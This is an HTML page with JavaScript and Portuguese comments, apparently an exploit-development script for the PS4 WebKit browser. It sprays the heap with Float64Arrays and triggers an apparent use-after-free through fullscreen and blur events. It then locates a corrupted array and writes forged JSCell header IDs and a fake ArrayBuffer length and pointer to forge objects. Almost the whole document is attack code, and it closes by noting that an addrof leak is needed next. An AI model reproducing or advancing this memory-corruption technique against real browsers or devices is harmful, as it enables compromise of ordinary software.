<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF - JSCell ID Hunter</title>
<style>
    body { background: #000; color: #0f0; font-family: monospace; padding: 20px; text-align: center; }
    button { background: #d00; color: #fff; padding: 20px 40px; font-size: 1.5em; border: 2px solid #fff; cursor: pointer; }
    #log { text-align: left; margin: 20px auto; border: 1px solid #333; padding: 10px; max-width: 800px; background: #111; }
    .success { color: #fff; background: #008800; padding: 5px; font-weight: bold; }
</style>
</head>
<body>

<h1>üïµÔ∏è JSCELL ID HUNTER</h1>
<p>Tentando transformar dados brutos em Objetos Vivos</p>

<button onclick="fire()">INICIAR CA√áADA</button>
<div id="log">Logs...</div>

<script>
    const Log = document.getElementById('log');
    function log(msg) { Log.innerHTML += msg + "<br>"; }

    function f2i(f) {
        let buf = new ArrayBuffer(8);
        (new Float64Array(buf))[0] = f;
        return (new BigUint64Array(buf))[0];
    }
    
    function i2f(i) {
        let buf = new ArrayBuffer(8);
        (new BigUint64Array(buf))[0] = BigInt(i);
        return (new Float64Array(buf))[0];
    }

    // IDs de JSCell comuns no PS4 (v√£o variar, mas esses s√£o bons chutes)
    // Format: 0x0000[Type][StructureID]
    const CANDIDATE_IDS = [
        0x0000160000000100n, // ArrayBuffer t√≠pico
        0x0000180000000100n, // TypedArray
        0x0000010000000100n, // JSString
        0x0000050000000100n  // JSObject
    ];

    let controllers = [];
    
    function fire() {
        log("1. Preparando Heap...");
        for(let i=0; i<8000; i++) {
            let ctrl = new Float64Array(8);
            ctrl[0] = i; 
            controllers.push(ctrl);
        }

        const doc = document.documentElement;
        if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
        
        window.onblur = function() {
            log("2. UAF Triggered! Construindo Fake Objects...");

            // Spray para criar buracos e controle
            let spray = [];
            const PATTERN = 2.121995791e-314;
            for(let i=0; i<12000; i++) {
                let p = new Float64Array(10);
                p.fill(PATTERN);
                spray.push(p);
            }

            // Achar o corrompido
            let corrupted = null;
            for(let i=0; i<controllers.length; i++) {
                if (controllers[i][0] === PATTERN) {
                    corrupted = controllers[i];
                    break;
                }
            }

            if(!corrupted) {
                log("‚ùå UAF falhou. Tente novamente.");
                return;
            }

            log("‚úÖ Array Corrompido Encontrado. Iniciando inje√ß√£o de IDs...");

            // TENTATIVA DE FORJAR OBJETO
            // Vamos iterar pelos IDs candidatos e escrev√™-los no cabe√ßalho
            
            // Passo A: Configurar o corpo do objeto falso (Fake ArrayBuffer)
            // Length = 0x1000, Ptr = 0x4141414141414141 (Crash garantido se acessado)
            corrupted[2] = i2f(0x1000n);
            corrupted[3] = i2f(0x4141414141414141n); 

            // Passo B: Tentar diferentes JSCell IDs no cabe√ßalho
            // Se acertarmos o ID, o Garbage Collector ou o JIT pode tentar ler
            // e vai crashar ao ver o ponteiro 0x4141...
            
            for(let id of CANDIDATE_IDS) {
                log(`Testando ID: 0x${id.toString(16)}...`);
                corrupted[0] = i2f(id); // Escreve o ID no cabe√ßalho
                
                // Tenta for√ßar o navegador a "notar" o objeto
                // Acessando propriedades ou for√ßando GC
                try {
                    let trash = new ArrayBuffer(100);
                } catch(e) {}
            }
            
            log("Testes conclu√≠dos. Se o console n√£o desligou, os IDs falharam.");
            log("Isso significa que precisamos vazar um StructureID v√°lido primeiro (addrof).");
        };
    }
</script>
</body>
</html>
